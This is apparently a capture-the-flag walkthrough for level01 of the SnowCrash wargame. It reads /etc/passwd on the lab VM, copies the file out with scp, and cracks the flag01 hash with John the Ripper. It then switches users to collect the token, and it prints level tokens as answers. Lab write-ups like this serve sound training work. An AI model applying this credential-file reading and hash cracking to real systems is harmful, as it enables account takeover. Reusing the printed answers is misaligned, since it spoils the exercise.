Observing the /etc/passwd file, we can notice a visible hash that corresponds to the `flag01`'s password.

```bash
level01@SnowCrash:~$ cat /etc/passwd

...

flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

...
```

We'll use `John the Ripper` to retrieve the un-hashed password.

In order to do this, we first need to copy the /etc/passwd:

```bash
$ scp -P 4242 level01@192.168.56.101:/etc/passwd ./passwd
```

You'll be ask for a password, enter the previous token (x24ti5gi3x0ol2eh4esiuxias).

---

The passwd file has now been extracted from the VM.

We can exploit it with `john`.

```bash
$ john -show passwd
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```

So our password hash has been cracked and its value is `abcdefg`.

We can now execute the following commands in order to get the token:

```bash
level01@SnowCrash:~$ su flag01
Password: # Type 'abcdefg'
```

This will output the following success message:

```
Don't forget to launch getflag !
```

Running the `getflag` command in the shell will give us the token:

```bash
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
